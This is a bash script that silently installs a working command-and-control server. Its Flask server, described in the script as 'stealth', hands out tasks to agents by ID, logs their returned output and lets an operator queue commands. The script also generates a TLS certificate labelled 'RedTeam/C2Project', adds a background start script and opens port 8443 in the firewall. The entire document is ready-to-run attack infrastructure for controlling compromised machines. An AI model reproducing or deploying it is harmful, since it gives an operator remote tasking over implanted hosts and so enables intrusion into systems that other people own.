#!/bin/bash

# Silent system update and package install
sudo apt update -qq && sudo apt upgrade -y -qq
sudo apt install -y python3 python3-pip ufw > /dev/null 2>&1

# Ensure Flask is installed
pip3 install flask > /dev/null 2>&1

# Setup server files
mkdir -p ~/c2_server/certs
cd ~/c2_server

# Write stealth server.py
cat > server.py << 'EOF'
from flask import Flask, request
import json, os

app = Flask(__name__)
DB_FILE = "task_db.json"

if not os.path.exists(DB_FILE):
    with open(DB_FILE, "w") as f:
        json.dump({}, f)

def load_tasks():
    with open(DB_FILE) as f:
        return json.load(f)

def save_tasks(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f)

@app.route("/task/<agent_id>", methods=["GET"])
def get_task(agent_id):
    tasks = load_tasks()
    task = tasks.pop(agent_id, "")
    save_tasks(tasks)
    return task

@app.route("/result/<agent_id>", methods=["POST"])
def post_result(agent_id):
    output = request.form.get("output", "")
    with open("results.log", "a") as log:
        log.write(f"{agent_id} → {output[:100]}\n")
    return "OK"

@app.route("/set/<agent_id>", methods=["POST"])
def set_task(agent_id):
    tasks = load_tasks()
    tasks[agent_id] = request.form.get("task", "")
    save_tasks(tasks)
    return "Task set"

if __name__ == "__main__":
    context = ("certs/cert.pem", "certs/key.pem")
    app.run(host="0.0.0.0", port=8443, ssl_context=context)
EOF

# TLS cert generation
openssl req -new -x509 -days 365 -nodes \
    -out certs/cert.pem -keyout certs/key.pem \
    -subj "/C=IN/ST=RedTeam/L=CyberOps/O=C2Project/CN=$(curl -s ifconfig.me)" > /dev/null 2>&1

# Write silent start script
cat > start_c2.sh << 'EOF'
#!/bin/bash
cd "$(dirname "$0")"
nohup python3 server.py > c2.log 2>&1 &
EOF

chmod +x start_c2.sh

# Enable UFW ports
sudo ufw allow 22 > /dev/null 2>&1
sudo ufw allow 8443 > /dev/null 2>&1
sudo ufw --force enable > /dev/null 2>&1

echo "[✔] C2 server installed silently. Run with: ~/c2_server/start_c2.sh"
